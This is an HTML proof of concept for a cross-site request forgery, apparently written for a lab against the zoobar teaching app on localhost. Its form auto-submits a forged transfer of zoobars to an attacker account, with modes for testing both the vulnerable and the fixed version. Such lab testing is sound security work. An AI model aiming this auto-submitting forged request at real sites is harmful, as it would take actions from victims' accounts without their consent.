<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="utf-8">
    <title>CSRF Transfer PoC</title>
    <script>
      function targetForMode(mode) {
        if (mode === "fixed") {
          return "https://localhost:8443/zoobar/index.cgi/transfer";
        }
        return "http://localhost:8080/zoobar/index.cgi/transfer";
      }

      function modeFromQuery() {
        const params = new URLSearchParams(window.location.search);
        return params.get("mode") || "vulnerable";
      }

      function submitAttack() {
        const mode = modeFromQuery();
        const form = document.getElementById("attack-form");
        const target = targetForMode(mode);

        form.action = target;
        form.submit();
      }
    </script>
  </head>
  <body onload="submitAttack()">
    <form id="attack-form" method="POST">
      <input type="hidden" name="recipient" value="att">
      <input type="hidden" name="zoobars" value="3">
      <input type="hidden" name="submission" value="Send">
      <noscript>
        <input type="submit" value="Submit forged transfer">
      </noscript>
    </form>
  </body>
</html>
